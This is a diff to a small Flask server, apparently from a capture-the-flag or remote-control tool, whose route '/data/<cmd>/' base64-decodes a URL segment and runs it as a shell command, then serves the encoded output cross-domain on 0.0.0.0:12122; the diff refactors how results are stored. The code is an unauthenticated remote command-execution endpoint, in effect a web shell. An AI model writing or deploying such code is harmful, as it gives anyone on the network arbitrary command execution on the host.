@@ -46,7 +46,7 @@ def is_master():
     data = read_flag_file()
     return corss_domain(data)
 
-data = {}
+data = ['']
 @app.route('/data/<cmd>/', methods=['GET', 'POST'])
 def cmd_result(cmd):
     '''
@@ -55,11 +55,15 @@ def cmd_result(cmd):
     :return: 执行结果
     '''
     cmd_str = base64.b64decode(cmd)
-    print('result:', cmd_str, cmd)
+
+    data.pop()
+
     if subprocess.getstatusoutput(cmd_str):
-        data_value = base64.b64encode((subprocess.getoutput(cmd_str)).encode('utf-8'))
-        data["data"]=data_value
-        print(data)
+        cmd_result=subprocess.getoutput(cmd_str)
+    
+        data_value = base64.b64encode(cmd_result.encode('utf-8'))
+        data.append(data_value.decode())
+
         str_ok = "命令执行成功"
         return corss_domain(str_ok)
     else:
@@ -71,9 +75,9 @@ def cmd_result(cmd):
 def cmd_result_data():
     '''
     数据路由
-    :return: 执行结果
+    :return: 执行结果`
     '''
-    return corss_domain({"data":data})
+    return corss_domain(data[-1])
 
 
 app.run(host='0.0.0.0', port=12122)
